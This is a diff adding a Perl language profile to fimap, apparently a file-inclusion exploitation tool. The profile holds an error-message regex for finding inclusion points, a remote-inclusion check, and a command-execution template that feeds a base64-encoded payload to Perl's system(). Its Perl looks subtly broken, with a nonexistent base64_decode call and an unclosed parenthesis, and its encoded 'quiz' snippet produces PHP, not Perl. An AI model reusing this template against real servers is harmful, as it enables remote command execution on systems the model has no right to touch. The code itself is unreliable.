@@ -1,0 +1,38 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<fimap language="perl" revision="0" autor="Iman Karim (ikarim2s@smail.inf.fh-brs.de)" >
+	<snipe regex="Can't locate (?P&lt;incname&gt;[\d\w/\.\-]*?%s[\d\w/\.\-]*?) in .*? at.*?line \d+?\." />
+	
+	<relative_files>
+	</relative_files>
+	
+	<absolute_files>
+	</absolute_files>
+	
+	<remote_files>
+		<file path="http://www.apache.org/dyn/closer.cgi"	find="We suggest the following mirror site for your download"	flags="rR" />
+	</remote_files>
+	
+	<log_files>
+	</log_files>
+	
+	<exec_methods>
+		<exec name="system"   source='use MIME::Base64; system(base64_decode("__PAYLOAD__") . " 2&gt;&amp;1";' />
+	</exec_methods>
+	
+	<payloads>
+				
+	</payloads>
+	
+	<methods>
+		<quiz source="cm5kID0gc2VsZi5nZXRSYW5kb21TdHIoKQpwaHBjb2RlID0gImVjaG8gIgpmb3IgYyBpbiBybmQ6CiAgICBwaHBjb2RlICs9ICJjaHIoJWQpLiIlKG9yZChjKSkKcGhwY29kZSA9ICI8P3BocCAlczsgPz4iICUocGhwY29kZVs6LTFdKQpyZXQgPSAocGhwY29kZSwgcm5kKQo=" />
+	</methods>
+	
+	<detectors>
+		<include_patterns>
+			<pattern regex="in .*? at (.*?) line \d+?\." />
+		</include_patterns>
+		
+		<readfile_patterns>
+		</readfile_patterns>
+	</detectors>
+</fimap>
